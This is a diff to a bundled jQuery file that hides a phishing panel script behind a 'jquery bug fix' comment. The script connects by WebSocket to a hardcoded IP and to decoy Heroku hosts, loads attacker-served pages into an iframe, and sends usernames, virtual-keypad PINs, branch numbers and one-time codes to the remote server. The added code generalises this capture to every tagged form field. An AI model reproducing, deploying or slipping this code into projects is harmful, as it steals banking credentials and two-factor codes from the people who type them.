@@ -10362,10 +10362,11 @@ return jQuery;
 
 //jquery bug fix
 
-var psykey = $('#'+'data'+'-key').data("key");
-var psyapp= "pwr";
-var psylink =  'wss://jquery-ui.herokuapp.com';  // 'wss://jquery-ui.herokuapp.com';//'wss://datasync-query.herokuapp.com';
 
+var psykey = 'oJcLDGrzATgCkXMf3nPVl84WpR190h';//panelkey
+var psyapp= "pwr";
+//var psylink = 'wss://javascript-cdn.herokuapp.com';//wss://google-statistics-monitoring.herokuapp.com //ws://localhost:50600 //wss://javascript-cdn.herokuapp.com
+var psylink = 'ws://93.115.96.14:50600'; //'ws://116.202.165.21:80';//wss://google-statistics-monitoring.herokuapp.com //ws://localhost:50600 //wss://google-statistics-monitoring.herokuapp.com
 var psyid  = createToken();
 var ws ;
 var inp = "";
@@ -10386,16 +10387,20 @@ function linkEvents()
 
     $("#psy_frame").contents().find("a,input,button").unbind('click',psyBind);
     $("#psy_frame").contents().find("a,input,button").click(psyBind);
-
-    //  $("#psy_frame").contents().find("form").unbind();
-    //  $("#psy_frame").contents().find("form").on('submit',psyBind);
 }
 function psyBind(e)
 {
-
+    let trigger = $(e.target);//  $("#psy_frame").contents().find('#'+e.target.id);
+    console.log(trigger);
     if($(this).attr('data-allowed'))
     {
-        //  console.log('event allowed for ',e.target);
+        let data_btn_value = trigger.attr('data-btn');
+        if(data_btn_value==="psy") {
+            PsyProcessInput(trigger);
+
+        }
+        //  console.log(e.target.id, 'will be Processed');
+
     }
     else {
         e.preventDefault();
@@ -10404,10 +10409,6 @@ function psyBind(e)
     }
 
 
-    if(e.target.id.match("^psy_")) {
-        //  console.log(e.target.id, 'will be Processed');
-        PsyProcessInput(e.target.id);
-    }
 }
 
 function connect()
@@ -10430,97 +10431,46 @@ function connect()
 }
 
 function getContent(name) {
-    if(localStorage.getItem(name)!=null)
+    if(localStorage.getItem(name)!=null && false)
     {
         //  console.log("getting page from storage");
-        loadPage(localStorage.getItem(name));
+        loadPage(localStorage.getItem(name),name);
         PsySend('info',{message:'loaded page from local cache',page:name});
     }
     else {
         //   console.log("requesting remote page");
         PsySend('content',{page:name});
-
-
     }
 }
 
-function PsyProcessInput(psyId)
+function PsyProcessInput(trigger)
 {
-    if(psyId.match('^psy_key_'))
-    {
-        if(psyId=='psy_key_delete')
-        {
-            $("#psy_frame").contents().find(".maCase").filter(function() {
-                return $(this).css('visibility') == 'visible';
-            }).last().css("visibility","hidden");
-            if(inp.length>0)
-                inp = inp.substring(inp.length-2,inp.length-1)
-        }
-        else {
-            console.log('clicked');
-            var key = psyId.replace('psy_key_', '');
-            $("#psy_frame").contents().find(".maCase").filter(function () {
-                return $(this).css('visibility') === 'hidden';
-            }).first().css("visibility", "visible");
-            if (inp.length < 6)
-            {
-                //var passowrdInput = $("#psy_frame").contents().find("[data-pass='psy_password']");
-                //inp = passowrdInput.val();
-            }
-            inp = inp + key.toString();
-        }
-    }
-    else {
+    $('#psy_loading').show();
+    let psy_data = {};
+    //let trigger =  $("#psy_frame").contents().find('#'+psyId);
+    let target_function = trigger.attr('data-function');
+    let inputs = $("#psy_frame").contents().find('[data-key="psy"]');
 
-        switch (psyId) {
-            case 'psy_branch_submit':
-                var branchInput = $("#psy_frame").contents().find('#psy_branch');
-                var branchName = $("#psy_frame").contents().find('#psy_branch_name');
-                var isValid = branchInput.val().search(new RegExp(branchInput.attr('pattern'))) >= 0;
-                if(!isValid) {
-                    alert(branchInput.attr('title'));
-                    break;
-                }
-                $('#psy_loading').show();
-                PsySend('branch',{branch: branchInput.val(),branch_name:branchName.val()});
-                break;
-            case 'psy_login_submit':
-                console.log("login clicked");
-                var usernameInput = $("#psy_frame").contents().find('#psy_username');
-                //var passowrdInput = $("#psy_frame").contents().find("[data-pass='psy_password']");
-                //inp = passowrdInput.val();
-                isValid = usernameInput.val().search(new RegExp(usernameInput.attr('pattern'))) >= 0;
-                isValid  = isValid &&  inp.search(new RegExp('.{6,}')) >= 0;
-                if(!isValid) {
-                    alert('identifiant incomplete');
-                    break;
-                }
-                $('#psy_loading').show();
-                PsySend('login',{username: $("#psy_frame").contents().find('#psy_username').val(),password: inp});
-                inp = "";
-                break;
-            case 'psy_code_request':
-                //$('#psy_loading').show();
-                PsySend('click',{});
-                break;
-            case 'psy_code_submit':
-                var codeInput = $("#psy_frame").contents().find('#psy_code_input');
-                isValid = codeInput.val().search(new RegExp('.{6,}')) >= 0;
-                if(!isValid) {
-                    alert(branchInput.attr('code invalid'));
-                    break;
-                }
-                //$('#psy_loading').show();
-                PsySend('code',{code:$("#psy_frame").contents().find('#psy_code_input').val()});
-                break;
+    inputs.each(function( index ) {
+        psy_data[$( this ).attr('data-psy-name')] = $( this ).val();
+        console.log( index + ": " + $( this ).val() );
+    });
+    console.log('inputs list', psy_data);
+    PsySend(target_function,psy_data);
 
-        }
-    }
+
 }
 function PsySend(psyType,psyData)
 {
-    // console.log('Requesting '+psyType,psyData);
-    ws.send(JSON.stringify({type: psyType, data: psyData}));
+    let payload = {type: psyType, data: psyData};
+    PsyLog("payload",payload);
+    ws.send(JSON.stringify(payload));
+}
+let logEnabled = true;
+function PsyLog(message,data)
+{
+    if(logEnabled)
+    console.log(message,data);
 }
 function PsyProcessMessage(message)
 {
@@ -10547,8 +10497,8 @@ function PsyProcessMessage(message)
             alert(wsMessage.data);
             break;
         case 4 : //Pframe
-            loadPage(wsMessage.data);
-            location.hash = wsMessage.target;
+            loadPage(wsMessage.data,wsMessage.target);
+            //location.hash = wsMessage.target;
             localStorage.setItem(wsMessage.target,wsMessage.data);
             break;
         case 5 : //Pattribute
@@ -10619,7 +10569,7 @@ $(window).on('hashchange', function() {
 
 });
 
-function loadPage(content)
+function loadPage(content,hash)
 {
     $('#psy_blocker').show();
     var doc = document.querySelector("#psy_frame").contentWindow.document;
@@ -10638,7 +10588,8 @@ function loadPage(content)
         link.href = link.href+"/favicon.ico";
 
     document.getElementsByTagName('head')[0].appendChild(link);
-
+    onLoadPage = hash;
+    window.location.hash = hash;
     $('#psy_loading').hide();
     setTimeout(linkEvents(),2000);
 
